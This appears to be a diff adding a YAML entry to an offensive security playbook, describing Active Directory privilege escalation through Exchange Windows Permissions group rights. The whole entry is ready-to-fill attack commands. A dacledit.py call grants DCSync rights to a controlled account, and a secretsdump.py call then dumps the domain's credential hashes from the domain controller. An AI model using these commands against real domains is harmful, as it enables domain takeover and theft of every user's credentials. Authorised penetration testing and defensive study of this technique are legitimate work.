@@ -1,0 +1,11 @@
+name: ExchangePrivEsc
+description: Exchange groups often have WriteDacl on domain - escalate to DA
+commands:
+- '# If member of Exchange Windows Permissions:'
+- '# Grant DCSync rights to controlled user'
+- dacledit.py -action 'write' -rights 'DCSync' -principal '<YOUR_USER>' -target '<DOMAIN>' '<DOMAIN>/<EXCHANGE_USER>:<PASSWORD>'
+- ''
+- '# Then DCSync'
+- secretsdump.py '<DOMAIN>/<YOUR_USER>:<PASSWORD>@<DC>'
+opsec: []
+references: []
